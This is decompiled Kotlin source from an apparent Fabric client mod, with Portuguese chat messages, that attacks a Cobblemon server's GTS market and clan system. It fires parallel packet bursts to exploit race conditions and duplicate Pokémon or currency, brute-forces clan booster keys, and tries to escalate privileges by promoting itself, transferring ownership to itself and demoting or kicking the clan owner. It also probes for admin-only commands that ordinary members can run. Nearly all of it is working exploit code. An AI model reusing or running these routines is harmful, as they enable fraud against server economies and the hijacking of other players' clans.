            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(ListPokemonPayload(`$slot`, `$price`) as class_8710)
            })
         }

         `this$0`.msg(`$source`, "   Verifique /gts → 'Meus Anúncios'.", class_124.field_1054)
         `this$0`.msg(`$source`, "   Se aparecer >1 listing do mesmo pokémon = DUPE (server lê party[slot] sem lock).", class_124.field_1061)
         `this$0`.msg(`$source`, "   Se aparecer 1 só e os outros viraram erro = OK.", class_124.field_1060)
         Unit.INSTANCE
      })
   }

   private fun listReplay(source: FabricClientCommandSource, slot: Int, price: Long, n: Int) {
      this.msg(source, ">> Replay-B: $n × ListPokemonPayload com 50ms entre", class_124.field_1075)
      var delayMs: Long = 0L

      repeat(n) { var6 ->
         this.pool.schedule({ 
            try {
               ClientPlayNetworking.send(ListPokemonPayload(`$slot`, `$price`) as class_8710)
            } catch (var6: java.lang.Throwable) {
               `this$0`.msg(`$source`, "   !! erro: ${var6.getMessage()}", class_124.field_1061)
            }
         }, delayMs, TimeUnit.MILLISECONDS)
         delayMs += 50
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "<< Replay terminado. Confira 'Meus Anúncios'.", class_124.field_1075)
      }, delayMs + (long)500, TimeUnit.MILLISECONDS)
   }

   private fun massList(source: FabricClientCommandSource, price: Long) {
      this.send(source, "Race-A: mass-list dos 6 slots simultaneamente", { 
         val var4: Byte = 6

         repeat(var4) { var5 ->
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(ListPokemonPayload(`$slot`, `$price`) as class_8710)
            })
         }

         `this$0`.msg(`$source`, "   Esperado: 6 listings (1 por slot ocupado).", class_124.field_1060)
         `this$0`.msg(`$source`, "   Anomalia: pokémon errado no listing, ou party com slots zoados = race.", class_124.field_1054)
         `this$0`.msg(`$source`, "   DUPE: >6 listings ou pokémon que sobrou na party + listado.", class_124.field_1061)
         Unit.INSTANCE
      })
   }

   private fun doubleList(source: FabricClientCommandSource, sa: Int, sb: Int, price: Long) {
      this.send(source, "Race: ListPokemonPayload slot $sa + slot $sb em paralelo", { 
         `this$0`.pool.submit({ 
            ClientPlayNetworking.send(ListPokemonPayload(`$sa`, `$price`) as class_8710)
         })
         `this$0`.pool.submit({ 
            ClientPlayNetworking.send(ListPokemonPayload(`$sb`, `$price`) as class_8710)
         })
         `this$0`.msg(`$source`, "   Esperado: 2 listings, 1 de cada slot.", class_124.field_1060)
         `this$0`.msg(`$source`, "   Bug: 2 listings do MESMO pokémon (server leu party[sa] e party[sb] que apontaram pro mesmo objeto).", class_124.field_1061)
         Unit.INSTANCE
      })
   }

   private fun withdrawBurst(source: FabricClientCommandSource, id: UUID, n: Int) {
      this.send(source, "Race-H: $n × WithdrawListingPayload($id) em PARALELO", { 
         repeat(`$n`) { var4 ->
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(WithdrawListingPayload(`$id`) as class_8710)
            })
         }

         `this$0`.msg(`$source`, "   Esperado: 1 retorno do pokémon.", class_124.field_1060)
         `this$0`.msg(`$source`, "   DUPE: pokémon volta MAIS DE 1 VEZ pra party (verifica /polaris gts party após).", class_124.field_1061)
         Unit.INSTANCE
      })
   }

   private fun selfPurchaseGuide(source: FabricClientCommandSource) {
      this.msg(source, ">> D: Self-purchase test (manual)", class_124.field_1075)
      this.msg(source, "   1. Liste um pokémon: /polaris gts list 0 1000", class_124.field_1080)
      this.msg(source, "   2. Anote o balance ANTES e a taxa cobrada (server fala no chat).", class_124.field_1080)
      this.msg(source, "   3. Abra /gts → 'Meus Anúncios' → clica no listado → /polaris gts uuid", class_124.field_1080)
      this.msg(source, "   4. Compra o próprio: /polaris gts purchase <uuid>", class_124.field_1080)
      this.msg(source, "   5. Verifica:", class_124.field_1054)
      this.msg(source, "      a) Server recusou 'Não pode comprar próprio anúncio' → ✅ Seguro", class_124.field_1060)
      this.msg(source, "      b) Pokémon volta + balance INTACTO = retorno limpo, OK", class_124.field_1060)
      this.msg(source, "      c) Pokémon volta + balance MENOR que ANTES = vc 'pagou' a si mesmo perdendo taxa", class_124.field_1054)
      this.msg(source, "      d) DUPE: pokémon volta + balance MAIOR que ANTES = bug econômico", class_124.field_1061)
   }

   private fun tradeSelfGuide(source: FabricClientCommandSource, slot: Int, species: String) {
      this.send(
         source,
         "E: Trade-self — lista slot $slot pedindo $species (que vc tem em outro slot)",
         { 
            ClientPlayNetworking.send(TradePokemonPayload(`$slot`, PokemonSpec(`$species`, 1, false, null, null, MapsKt.emptyMap())) as class_8710)
            `this$0`.msg(`$source`, "   Próximo passo manual:", class_124.field_1054)
            `this$0`.msg(`$source`, "   1. Abra /gts → 'Meus Anúncios' → clique → /polaris gts uuid", class_124.field_1080)
            `this$0`.msg(`$source`, "   2. /polaris gts fulfill <uuid> <slot_com_$`$species`>", class_124.field_1080)
            `this$0`.msg(
               `$source`,
               "   3. Se server aceitar vc completar SEU próprio trade = pode dupar (pokémon do slot $`$slot` E pokémon $`$species` pro outro slot?)",
               class_124.field_1061
            )
            Unit.INSTANCE
         }
      )
   }

   private fun scenarioMoveThenList(source: FabricClientCommandSource, slot: Int, price: Long) {
      this.msg(source, ">> G: Cenario TOCTOU -- TRADE preparado, depois lista", class_124.field_1075)
      this.msg(source, "   PASSO 1 (MANUAL): inicie TRADE com outro player.", class_124.field_1054)
      this.msg(source, "   PASSO 2 (MANUAL): coloque o Pokemon do slot $slot na janela de TRADE.", class_124.field_1054)
      this.msg(source, "   PASSO 3: deixe o outro player pronto para confirmar.", class_124.field_1054)
      this.msg(source, "   PASSO 4: rode AGORA: /polaris gts list $slot $price", class_124.field_1054)
      this.msg(source, "   ESPERADO: trade vence OU list vence, nunca os dois.", class_124.field_1060)
      this.msg(source, "   VULNERAVEL: trade completou + listing criado = DUPE critico.", class_124.field_1061)
   }

   private fun scenarioListThenTrade(source: FabricClientCommandSource, slot: Int, price: Long) {
      this.msg(source, ">> C: Lista + tenta concluir TRADE com o Pokemon listado", class_124.field_1075)
      this.msg(source, "   PASSO 1: Enviando ListPokemonPayload(slot=$slot, price=$price)...", class_124.field_1080)
      ClientPlayNetworking.send(ListPokemonPayload(slot, price) as class_8710)
      this.msg(source, "   Agora confirme o TRADE com outro player e verifique se o listing tambem ficou ativo.", class_124.field_1054)
   }

   private fun scenarioListCountdown(source: FabricClientCommandSource, slot: Int, price: Long, delaySec: Int) {
      PolarisState.blockGtsUi = true
      this.msg(source, ">> Scenario list_countdown:", class_124.field_1075)
      this.msg(source, "   block_gts_ui auto-ativado (UI do GTS bloqueada durante o teste)", class_124.field_1080)
      this.msg(source, "   Abra/prepare o TRADE com outro player e coloque o Pokemon do slot $slot.", class_124.field_1054)
      this.msg(source, "   Confirme o TRADE quando o countdown chegar em 2.", class_124.field_1054)
      this.msg(source, "   O list vai disparar em $delaySec segundos.", class_124.field_1054)

      for (i in delaySec downTo 1) {
         this.pool.schedule({ 
            if (`$seconds` == 2) {
               `this$0`.msg(`$source`, "   2... CONFIRME O TRADE AGORA.", class_124.field_1065)
            } else {
               `this$0`.msg(`$source`, "   ... $`$seconds` ...", class_124.field_1065)
            }
         }, (long)(delaySec - i) * 1000L, TimeUnit.MILLISECONDS)
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "   ENVIANDO ListPokemonPayload($`$slot`, $`$price`) AGORA!", class_124.field_1061)

         try {
            ClientPlayNetworking.send(ListPokemonPayload(`$slot`, `$price`) as class_8710)
            `this$0`.msg(`$source`, "   Confira: TRADE completou + listing criado = DUPE.", class_124.field_1061)
         } catch (var6: java.lang.Throwable) {
            `this$0`.msg(`$source`, "   !! erro: ${var6.getMessage()}", class_124.field_1061)
         }
      }, (long)delaySec * 1000L, TimeUnit.MILLISECONDS)
      this.pool.schedule({ 
         PolarisState.blockGtsUi = false
         `this$0`.msg(`$source`, "block_gts_ui auto-desativado (2s pos-fire)", class_124.field_1060)
      }, (long)delaySec * 1000L + 2000L, TimeUnit.MILLISECONDS)
   }

   private fun scenarioListDuringTrade(source: FabricClientCommandSource, slot: Int, price: Long, delaySec: Int) {
      PolarisState.blockGtsUi = true
      this.msg(source, ">> F-17c: TRADE + List race (TOCTOU entre jogadores)", class_124.field_1075)
      this.msg(source, "   block_gts_ui auto-ativado (UI do GTS nao vai abrir)", class_124.field_1080)
      this.msg(source, "   PASSOS (voce tem $delaySec segundos):", class_124.field_1054)
      this.msg(source, "   1. INICIE TRADE com outro jogador AGORA", class_124.field_1054)
      this.msg(source, "   2. Coloque o Pokemon do slot $slot no TRADE", class_124.field_1054)
      this.msg(source, "   3. Outro jogador coloca algo e fica pronto", class_124.field_1054)
      this.msg(source, "   4. Quando chegar em 2: CONFIRME O TRADE", class_124.field_1054)
      this.msg(source, "   5. Quando chegar em 0: Polaris envia o list automaticamente", class_124.field_1054)

      for (i in delaySec downTo 1) {
         this.pool.schedule({ 
            if (`$seconds` == 2) {
               `this$0`.msg(`$source`, "   2... CONFIRME O TRADE AGORA.", class_124.field_1065)
            } else {
               `this$0`.msg(`$source`, "   ... $`$seconds` ...", class_124.field_1065)
            }
         }, (long)(delaySec - i) * 1000L, TimeUnit.MILLISECONDS)
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "   ENVIANDO ListPokemonPayload($`$slot`, $`$price`) DURANTE O TRADE!", class_124.field_1061)

         try {
            ClientPlayNetworking.send(ListPokemonPayload(`$slot`, `$price`) as class_8710)
            `this$0`.msg(`$source`, "   List enviado. Confira se o TRADE completou e se o listing foi criado.", class_124.field_1061)
            `this$0`.msg(`$source`, "   Cenarios:", class_124.field_1054)
            `this$0`.msg(`$source`, "     a) Trade completou + listing criado = DUPE", class_124.field_1061)
            `this$0`.msg(`$source`, "     b) Trade falhou + listing criado = list venceu, OK", class_124.field_1060)
            `this$0`.msg(`$source`, "     c) Trade completou + listing falhou = trade venceu, OK", class_124.field_1060)
            `this$0`.msg(`$source`, "     d) Tudo falhou = server detectou conflito, OK", class_124.field_1060)
         } catch (var6: java.lang.Throwable) {
            `this$0`.msg(`$source`, "   !! erro: ${var6.getMessage()}", class_124.field_1061)
         }
      }, (long)delaySec * 1000L, TimeUnit.MILLISECONDS)
      this.pool.schedule({ 
         PolarisState.blockGtsUi = false
         `this$0`.msg(`$source`, "block_gts_ui auto-desativado.", class_124.field_1080)
         `this$0`.msg(`$source`, "   Confira: /polaris gts party + /gts -> Meus Anuncios", class_124.field_1054)
      }, (long)delaySec * 1000L + 30000L, TimeUnit.MILLISECONDS)
   }

   private fun scenarioListQuick(source: FabricClientCommandSource, slot: Int, price: Long, delayMs: Int) {
      PolarisState.blockGtsUi = true
      this.msg(source, ">> list_quick: dispara em $delayMsms (block_gts_ui ON)", class_124.field_1075)
      this.pool.schedule({ 
         try {
            ClientPlayNetworking.send(ListPokemonPayload(`$slot`, `$price`) as class_8710)
            `this$0`.msg(`$source`, "   \ud83d\ude80 ListPokemonPayload($`$slot`, $`$price`) enviado!", class_124.field_1061)
         } catch (var6: java.lang.Throwable) {
            `this$0`.msg(`$source`, "   !! ${var6.getMessage()}", class_124.field_1061)
         }
      }, (long)delayMs, TimeUnit.MILLISECONDS)
      this.pool.schedule({ 
         PolarisState.blockGtsUi = false
      }, (long)delayMs + 30000L, TimeUnit.MILLISECONDS)
   }

   private fun scenarioListAutocheck(source: FabricClientCommandSource, slot: Int, price: Long) {
      this.msg(source, ">> scenario_list_autocheck — analisa se o pokémon some da party após list.", class_124.field_1075)
      this.msg(source, "   PARTY ANTES:", class_124.field_1080)
      val before: java.util.List = this.snapshotParty()
      this.printPartySnapshot(source, before)
      this.msg(source, "   Disparando ListPokemonPayload(slot=$slot, price=$price)...", class_124.field_1080)

      try {
         ClientPlayNetworking.send(ListPokemonPayload(slot, price) as class_8710)
      } catch (var7: java.lang.Throwable) {
         this.msg(source, "   !! erro: ${var7.getMessage()}", class_124.field_1061)
         return
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "   PARTY DEPOIS (esperou 1.5s):", class_124.field_1080)
         val after: java.util.List = `this$0`.snapshotParty()
         `this$0`.printPartySnapshot(`$source`, after)
         val before0: java.lang.String = CollectionsKt.getOrNull(`$before`, `$slot`) as java.lang.String
         val after0: java.lang.String = CollectionsKt.getOrNull(after, `$slot`) as java.lang.String
         if (before0 != null && after0 != null && before0 == after0) {
            `this$0`.msg(`$source`, "   ⚠️ MESMO POKÉMON CONTINUA NA PARTY — possível TOCTOU. Tenta confirmar o TRADE agora!", class_124.field_1061)
         } else if (before0 != null && after0 == null) {
            `this$0`.msg(`$source`, "   ✅ Pokémon saiu da party. List atômico, sem TOCTOU window.", class_124.field_1060)
         } else if (before0 != null && after0 != null && !(before0 == after0)) {
            `this$0`.msg(`$source`, "   ⚠️ Pokémon do slot MUDOU (uuid diferente). Verifique manualmente.", class_124.field_1054)
         } else {
            `this$0`.msg(`$source`, "   ? Slot já estava vazio antes. Lista falhou ou inconsistente.", class_124.field_1054)
         }
      }, 1500L, TimeUnit.MILLISECONDS)
   }

   private fun snapshotParty(): List<String?> {
      var cobblemonClientClass: java.util.List
      try {
         val var19: Class = Class.forName("com.cobblemon.mod.common.client.CobblemonClient")
         val storage: Any = var19.getMethod("getStorage").invoke(var19.getField("INSTANCE").get(null))
         val var10000: Any = storage.getClass().getMethod("getParty").invoke(storage)
         val `$this$mapTo$iv$iv`: java.lang.Iterable = var10000 as java.lang.Iterable
         val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var10000 as java.lang.Iterable, 10))

         for (`item$iv$iv` in `$this$mapTo$iv$iv`) {
            val pkm: Any = `item$iv$iv`
            val var20: java.lang.String
            if (`item$iv$iv` == null) {
               var20 = null
            } else {
               var var14: java.lang.String
               try {
                  var14 = pkm.getClass().getMethod("getUuid").invoke(pkm).toString()
               } catch (var17: java.lang.Throwable) {
                  var14 = "<?>"
               }

               var20 = var14
            }

            `destination$iv$iv`.add(var20)
         }

         cobblemonClientClass = `destination$iv$iv` as java.util.List
      } catch (var18: java.lang.Throwable) {
         cobblemonClientClass = CollectionsKt.emptyList()
      }

      return cobblemonClientClass
   }

   private fun printPartySnapshot(source: FabricClientCommandSource, snap: List<String?>) {
      if (snap.isEmpty()) {
         this.msg(source, "      (party não lida via reflection)", class_124.field_1061)
      } else {
         val `$this$forEachIndexed$iv`: java.lang.Iterable = snap
         var `index$iv`: Int = 0

         for (`item$iv` in `$this$forEachIndexed$iv`) {
            val var8: Int = `index$iv`++
            if (var8 < 0) {
               CollectionsKt.throwIndexOverflow()
            }

            var uuid: java.lang.String
            var var13: java.lang.String
            run label43@{
               uuid = `item$iv` as java.lang.String
               if (`item$iv` as java.lang.String != null) {
                  var13 = StringsKt.take(uuid, 8)
                  if (var13 != null) {
                     return@label43
                  }
               }

               var13 = "(empty)"
            }

            this.msg(source, "      [$var8] $var13", if (uuid == null) class_124.field_1063 else class_124.field_1080)
         }
      }
   }

   private fun buyChain(source: FabricClientCommandSource, uuids: List<UUID>) {
      if (uuids.isEmpty()) {
         this.msg(source, "!! Nenhuma UUID válida. Passe vírgula-separadas: uuid1,uuid2,uuid3", class_124.field_1061)
      } else {
         this.msg(source, ">> BUY-CHAIN: ${uuids.size()} compras em PARALELO. Balance ANTES=${GtsClientData.INSTANCE.getBalance()}", class_124.field_1075)

         for (id in uuids) {
            this.pool.submit({ 
               try {
                  ClientPlayNetworking.send(PurchasePokemonPayload(`$id`) as class_8710)
               } catch (var4: java.lang.Throwable) {
                  `this$0`.msg(`$source`, "   !! ${var4.getMessage()}", class_124.field_1061)
               }
            })
         }

         this.msg(source, "   Disparados ${uuids.size()} packets.", class_124.field_1054)
         this.msg(source, "   DUPE: balance final > balance_antes - SUM(preços) = compras processadas sem revalidar balance.", class_124.field_1061)
         this.msg(source, "   Verifique: /polaris gts balance + /polaris gts party em 3-5s.", class_124.field_1054)
      }
   }

   private fun buySpamDifferent(source: FabricClientCommandSource, uuids: List<UUID>) {
      if (uuids.isEmpty()) {
         this.msg(source, "!! Nenhuma UUID válida.", class_124.field_1061)
      } else {
         this.send(source, "SPAM-DIFF: ${uuids.size()} purchases de UUIDs diferentes paralelos", { 
            for (id in `$uuids`) {
               `this$0`.pool.submit({ 
                  ClientPlayNetworking.send(PurchasePokemonPayload(`$id`) as class_8710)
               })
            }

            `this$0`.msg(`$source`, "   Se vc não tinha money pra todos mas todos completaram = sem revalidação", class_124.field_1061)
            Unit.INSTANCE
         })
      }
   }

   private fun fulfillEmptySlots(source: FabricClientCommandSource, id: UUID) {
      val var3: Byte = 6

      repeat(var3) { var4 ->
         this.pool.submit({ 
            try {
               ClientPlayNetworking.send(FulfillTradePayload(`$id`, `$slot`) as class_8710)
               `this$0`.msg(`$source`, "   -> fulfill slot=$`$slot`", class_124.field_1080)
            } catch (var5: java.lang.Throwable) {
               `this$0`.msg(`$source`, "   !! slot=$`$slot` erro: ${var5.getMessage()}", class_124.field_1061)
            }
         })
      }

      this.msg(source, "   Esperado: server recusa slots vazios/com pokémon errado.", class_124.field_1060)
      this.msg(source, "   DUPE: vc recebe pokémon entregando slot inválido.", class_124.field_1061)
   }

   private fun inspectParty(source: FabricClientCommandSource) {
      this.msg(source, ">> Party slots (Cobblemon client):", class_124.field_1075)

      try {
         val e: Class = Class.forName("com.cobblemon.mod.common.client.CobblemonClient")
         val storage: Any = e.getMethod("getStorage").invoke(e.getField("INSTANCE").get(null))
         var var10000: Any = storage.getClass().getMethod("getParty").invoke(storage)
         val party: java.lang.Iterable = var10000 as java.lang.Iterable
         var idx: Int = 0

         for (pokemon in party) {
            if (pokemon == null) {
               this.msg(source, "   [$idx] (empty)", class_124.field_1063)
            } else {
               try {
                  val ex: Any = pokemon.getClass().getMethod("getSpecies").invoke(pokemon)

                  var color: Boolean
                  try {
                     var10000 = pokemon.getClass().getMethod("getTradeable").invoke(pokemon)
                     color = var10000 as java.lang.Boolean
                  } catch (var16: java.lang.Throwable) {
                     color = true
                  }

                  this.msg(
                     source,
                     "   [$idx] ${ex.getClass().getMethod("getName").invoke(ex)} lv${pokemon.getClass().getMethod("getLevel").invoke(pokemon)} — uuid=${pokemon.getClass()
                        .getMethod("getUuid")
                        .invoke(pokemon)} — tradeable=$color",
                     if (color) class_124.field_1060 else class_124.field_1061
                  )
               } catch (var17: java.lang.Throwable) {
                  this.msg(source, "   [$idx] (erro lendo: ${var17.getMessage()})", class_124.field_1061)
               }
            }

            idx++
         }

         if (idx == 0) {
            this.msg(source, "   (party vazia)", class_124.field_1063)
         }
      } catch (var18: java.lang.Throwable) {
         this.msg(source, "!! Erro: ${var18.getClass().getSimpleName()}: ${var18.getMessage()}", class_124.field_1061)
         this.msg(source, "   (Cobblemon talvez tenha mudado API; veja stack trace no log)", class_124.field_1080)
         var18.printStackTrace()
      }
   }

   private fun inspectBalance(source: FabricClientCommandSource) {
      this.msg(source, ">> GTS balance (client cache): ${GtsClientData.INSTANCE.getBalance()}", class_124.field_1075)
      this.msg(source, "   (esse valor é só o cache local — pode estar desatualizado se vc não abriu /gts ultimamente)", class_124.field_1080)
   }

   private fun showSelectedUuid(source: FabricClientCommandSource) {
      val listing: PokemonSummary = GtsClientData.INSTANCE.getSelectedListing()
      if (listing == null) {
         this.msg(source, "!! Nenhum listing selecionado.", class_124.field_1061)
         this.msg(source, "   Workflow: abra /gts, vá em 'Meus Anúncios', CLIQUE no Pokémon, depois rode este comando.", class_124.field_1054)
      } else {
         this.msg(source, ">> Listing selecionado:", class_124.field_1075)
         this.msg(source, "   UUID    : ${listing.getListingId()}", class_124.field_1060)
         this.msg(source, "   Species : ${listing.getSpecies()}", class_124.field_1080)
         this.msg(source, "   Level   : ${listing.getLevel()}", class_124.field_1080)
         this.msg(source, "   Price   : ${listing.getPrice()}", class_124.field_1080)
         this.msg(source, "   Seller  : ${listing.getSellerName()}", class_124.field_1080)
         this.msg(source, "   Type    : ${listing.getAuctionType()}", class_124.field_1080)
         this.msg(source, "Cole o UUID em outros comandos: /polaris gts purchase ${listing.getListingId()}", class_124.field_1054)
      }
   }

   private fun spamPurchase(source: FabricClientCommandSource, id: UUID, n: Int) {
      this.send(source, "F-07: $n PurchasePokemonPayload($id) paralelos", { 
         val counter: AtomicInteger = AtomicInteger(0)

         repeat(`$n`) { var5 ->
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(PurchasePokemonPayload(`$id`) as class_8710)
               `$counter`.incrementAndGet()
            })
         }

         `this$0`.pool.submit({ 
            Thread.sleep(2000L)
            `this$0`.msg(`$source`, "Disparados: ${`$counter`.get()}/$`$n`", class_124.field_1054)
         })
         Unit.INSTANCE
      })
   }

   private fun racePurchaseWithdraw(source: FabricClientCommandSource, id: UUID, n: Int) {
      this.send(source, "F-06: $n Purchase + $n Withdraw para $id", { 
         repeat(`$n`) { var4 ->
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(PurchasePokemonPayload(`$id`) as class_8710)
            })
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(WithdrawListingPayload(`$id`) as class_8710)
            })
         }

         `this$0`.msg(`$source`, "Disparados ${`$n` * 2} packets em paralelo.", class_124.field_1054)
         Unit.INSTANCE
      })
   }

   private fun raceFulfill(source: FabricClientCommandSource, id: UUID, slot: Int, n: Int) {
      this.send(source, "F-07: $n FulfillTradePayload($id, slot=$slot) paralelos", { 
         repeat(`$n`) { var5 ->
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(FulfillTradePayload(`$id`, `$slot`) as class_8710)
            })
         }

         `this$0`.msg(`$source`, "Disparados $`$n` fulfills em paralelo.", class_124.field_1054)
         Unit.INSTANCE
      })
   }

   private fun bruteForceBoosterKeys(source: FabricClientCommandSource) {
      this.msg(source, ">> F-09: brute-forcing ${this.candidateBoosterKeys.size()} chaves de booster", class_124.field_1075)
      this.msg(source, "   ANOTE o gold do clã ANTES. Vai disparar 1 chave por 200ms.", class_124.field_1054)
      this.msg(source, "   Total: ~${this.candidateBoosterKeys.size() * 200 / 1000}s. Aguarde e confira o gold no fim.", class_124.field_1054)
      var delayMs: Long = 0L

      for (key in this.candidateBoosterKeys) {
         this.pool.schedule({ 
            try {
               ClientPlayNetworking.send(BuyClanBoosterPayload(`$key`) as class_8710)
               `this$0`.msg(`$source`, "   -> tentou '$`$key`'", class_124.field_1080)
            } catch (var4: java.lang.Throwable) {
               `this$0`.msg(`$source`, "   !! '$`$key`' erro: ${var4.getMessage()}", class_124.field_1061)
            }
         }, delayMs, TimeUnit.MILLISECONDS)
         delayMs += 200
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "<< F-09 brute force terminado. CONFIRA O GOLD DO CLÃ AGORA.", class_124.field_1075)
         `this$0`.msg(`$source`, "   Se caiu: alguma chave funcionou (bypass real).", class_124.field_1060)
         `this$0`.msg(`$source`, "   Se não mudou: todas rejeitadas (F-09 fechada OU chaves diferentes).", class_124.field_1060)
      }, delayMs + (long)500, TimeUnit.MILLISECONDS)
   }

   private fun boosterSpam(source: FabricClientCommandSource, key: String, n: Int) {
      this.send(source, "F-09 race: $n × BuyClanBoosterPayload('$key') em paralelo", { 
         repeat(`$n`) { var4 ->
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(BuyClanBoosterPayload(`$key`) as class_8710)
            })
         }

         `this$0`.msg(`$source`, "   Disparados $`$n` packets. Olha o gold do clã — se caiu $`$n`× o custo, sem lock. Se caiu 1×, OK.", class_124.field_1054)
         Unit.INSTANCE
      })
   }

   private fun listClanMembers(source: FabricClientCommandSource) {
      val members: java.util.List = ClanClientData.INSTANCE.getMembers()
      if (members.isEmpty()) {
         this.msg(source, "!! Sem membros listados. Abra /clan e espera 1-2s sincronizar.", class_124.field_1054)
      } else {
         this.msg(source, ">> Membros do clã (${members.size()}):", class_124.field_1075)

         for (m in members) {
            val var10000: java.lang.String = m.getRole().toUpperCase(Locale.ROOT)
            val color: class_124 = if (var10000 == "OWNER") class_124.field_1065 else (if (var10000 == "ADMIN") class_124.field_1075 else class_124.field_1080)
            this.msg(source, "   [${m.getRole()}] ${m.getName()} (${if (m.getOnline()) "ON" else "off"}) — ${m.getUuid()}", color)
         }

         this.msg(source, "Cole o UUID em: /polaris clan promote_uuid <uuid>", class_124.field_1054)
      }
   }

   private fun promoteSelfBurst(source: FabricClientCommandSource, uuid: UUID, n: Int) {
      this.send(source, "PRIV-ESC race: $n × PromoteMemberPayload(self=$uuid)", { 
         repeat(`$n`) { var4 ->
            `this$0`.pool.submit({ 
               ClientPlayNetworking.send(PromoteMemberPayload(`$uuid`) as class_8710)
            })
         }

         `this$0`.msg(`$source`, "   Depois: /polaris clan whoami pra ver se role mudou.", class_124.field_1054)
         `this$0`.msg(`$source`, "   Se role subiu N níveis (MEMBER→ADMIN→OWNER) = race no check.", class_124.field_1061)
         Unit.INSTANCE
      })
   }

   private fun privEscFull(source: FabricClientCommandSource) {
      val uuid: UUID = ClanClientData.INSTANCE.getSelfUuid()
      this.msg(source, ">> PRIV-ESC FULL SWEEP — disparando todos os ataques de escalação:", class_124.field_1075)
      this.msg(source, "   Target: self=$uuid (role atual: ${ClanClientData.INSTANCE.getSelfRole()})", class_124.field_1080)
      this.pool.schedule({ 
         try {
            ClientPlayNetworking.send(PromoteMemberPayload(`$uuid`) as class_8710)
            `this$0`.msg(`$source`, "   1. PromoteMemberPayload(self) enviado", class_124.field_1080)
         } catch (var4: java.lang.Throwable) {
         }
      }, 0L, TimeUnit.MILLISECONDS)
      this.pool.schedule({ 
         try {
            ClientPlayNetworking.send(TransferOwnershipPayload(`$uuid`) as class_8710)
            `this$0`.msg(`$source`, "   2. TransferOwnershipPayload(self) enviado", class_124.field_1080)
         } catch (var4: java.lang.Throwable) {
         }
      }, 300L, TimeUnit.MILLISECONDS)
      this.pool.schedule({ 
         val var3: Byte = 20

         repeat(var3) { var4 ->
            `this$0`.pool.submit({ 
               try {
                  ClientPlayNetworking.send(PromoteMemberPayload(`$uuid`) as class_8710)
               } catch (var2: java.lang.Throwable) {
               }
            })
         }

         `this$0`.msg(`$source`, "   3. 20× PromoteMemberPayload(self) burst", class_124.field_1080)
      }, 600L, TimeUnit.MILLISECONDS)
      val var6: java.util.Iterator = ClanClientData.INSTANCE.getMembers().iterator()

      var var10000: Any
      while (true) {
         if (var6.hasNext()) {
            val `element$iv`: Any = var6.next()
            val var10: java.lang.String = (`element$iv` as ClanMemberEntry).getRole().toUpperCase(Locale.ROOT)
            if (!(var10 == "OWNER")) {
               continue
            }

            var10000 = `element$iv`
            break
         }

         var10000 = null
         break
      }

      val owner: ClanMemberEntry = var10000 as ClanMemberEntry
      if (var10000 as ClanMemberEntry != null && !((var10000 as ClanMemberEntry).getUuid() == uuid)) {
         this.pool.schedule({ 
            try {
               ClientPlayNetworking.send(DemoteMemberPayload(`$owner`.getUuid()) as class_8710)
               `this$0`.msg(`$source`, "   4. DemoteMemberPayload(owner=${`$owner`.getUuid()}) enviado", class_124.field_1080)
            } catch (var4: java.lang.Throwable) {
            }
         }, 900L, TimeUnit.MILLISECONDS)
         this.pool.schedule({ 
            try {
               ClientPlayNetworking.send(KickMemberPayload(`$owner`.getUuid()) as class_8710)
               `this$0`.msg(`$source`, "   5. KickMemberPayload(owner) enviado", class_124.field_1080)
            } catch (var4: java.lang.Throwable) {
            }
         }, 1200L, TimeUnit.MILLISECONDS)
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "<< PRIV-ESC sweep concluído.", class_124.field_1075)
         `this$0`.msg(`$source`, "   Verifique /polaris clan whoami — se role subiu = bypass.", class_124.field_1054)
         `this$0`.msg(`$source`, "   Verifique /polaris clan members — owner caiu/foi kickado?", class_124.field_1054)
      }, 1700L, TimeUnit.MILLISECONDS)
   }

   private fun runChatCommand(source: FabricClientCommandSource, command: String, label: String) {
      this.msg(source, ">> $label", class_124.field_1075)
      this.msg(source, "   sending: /$command", class_124.field_1080)

      try {
         val handler: class_634 = class_310.method_1551().method_1562()
         if (handler == null) {
            this.msg(source, "!! networkHandler null (not in game?)", class_124.field_1061)
            return
         }

         handler.method_45730(command)
         this.msg(source, "   OK (comando enviado, aguarde resposta do server)", class_124.field_1060)
      } catch (var6: java.lang.Throwable) {
         this.msg(source, "!! ${var6.getClass().getSimpleName()}: ${var6.getMessage()}", class_124.field_1061)
         var6.printStackTrace()
      }
   }

   private fun adminCommandAudit(source: FabricClientCommandSource) {
      this.msg(source, ">> F-Cmd-Audit: testando ${this.adminOnlyCommands.size()} comandos admin-only", class_124.field_1075)
      this.msg(source, "   Rode como MEMBER. Cada que NÃO der erro = bypass.", class_124.field_1054)
      var delayMs: Long = 0L

      for (cmd in this.adminOnlyCommands) {
         this.pool.schedule({ 
            try {
               val var10000: class_634 = class_310.method_1551().method_1562()
               if (var10000 != null) {
                  var10000.method_45730(`$cmd`)
               }

               `this$0`.msg(`$source`, "   -> /$`$cmd`", class_124.field_1080)
            } catch (var4: java.lang.Throwable) {
               `this$0`.msg(`$source`, "   !! /$`$cmd` erro: ${var4.getMessage()}", class_124.field_1061)
            }
         }, delayMs, TimeUnit.MILLISECONDS)
         delayMs += 500
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "<< Audit terminado. Veja respostas no chat: qual deu erro = bloqueado, qual executou = bypass.", class_124.field_1075)
      }, delayMs + (long)500, TimeUnit.MILLISECONDS)
   }

   private fun cmdSpam(source: FabricClientCommandSource, command: String, n: Int) {
      this.send(source, "Spam: $n × /$command paralelos", lambda_0@{ 
         val handler: class_634 = class_310.method_1551().method_1562()
         if (handler == null) {
            `this$0`.msg(`$source`, "!! networkHandler null", class_124.field_1061)
            return@lambda_0 Unit.INSTANCE
         } else {
            repeat(`$n`) { var5 ->
               `this$0`.pool.submit({ 
                  try {
                     `$handler`.method_45730(`$command`)
